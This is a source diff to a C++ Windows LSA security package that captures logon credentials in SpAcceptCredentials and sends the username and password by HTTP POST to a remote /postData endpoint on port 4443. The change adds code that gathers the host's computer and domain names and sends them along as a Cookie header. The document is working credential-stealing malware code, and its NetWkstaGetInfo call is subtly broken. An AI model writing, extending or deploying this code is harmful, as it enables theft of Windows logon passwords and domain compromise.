@@ -1,4 +1,5 @@
 #define WIN32_NO_STATUS
+#define FORCE_UNICODE 
 #define SECURITY_WIN32
 #include <windows.h>
 #include "transport.h"
@@ -11,10 +12,26 @@
 #include <iostream>
 #include <string>
 #include <memory>
+#include <Lmwksta.h>
+#include <StrSafe.h>
+
 
 #pragma comment(lib, "Secur32.lib")
+#pragma comment(lib, "netapi32.lib")
 
 Agent agent{};
+
+std::wstring GetFullDomainName() {
+	WKSTA_INFO_102 info = { 0 };
+    if (NetWkstaGetInfo(NULL, 102, (LPBYTE*)&info)) return L"";
+    std::wstring localName = info.wki102_computername;
+    std::wstring domainName = info.wki102_langroup;
+
+	std::wstring FQDN{
+		L"localName=" + localName + L"&domainName=" + domainName 
+	};
+	return FQDN;
+}
 
 NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
 {
@@ -23,6 +40,7 @@ NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, 
         4443
     )};
     transport->Connect(L"POST", L"/postData", L"WINHTTP 1/0");
+    transport->AddHeader(L"Cookie", GetFullDomainName());
     agent.SetTransport(transport.get());
     agent.Ping();
 
@@ -52,6 +70,7 @@ NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRIN
         4443
     ) };
     transport->Connect(L"POST", L"/postData", L"WINHTTP 1/0");
+    transport->AddHeader(L"Cookie", GetFullDomainName());
     agent.SetTransport(transport.get());
     agent.SendCreds(login, password);
     return 0;
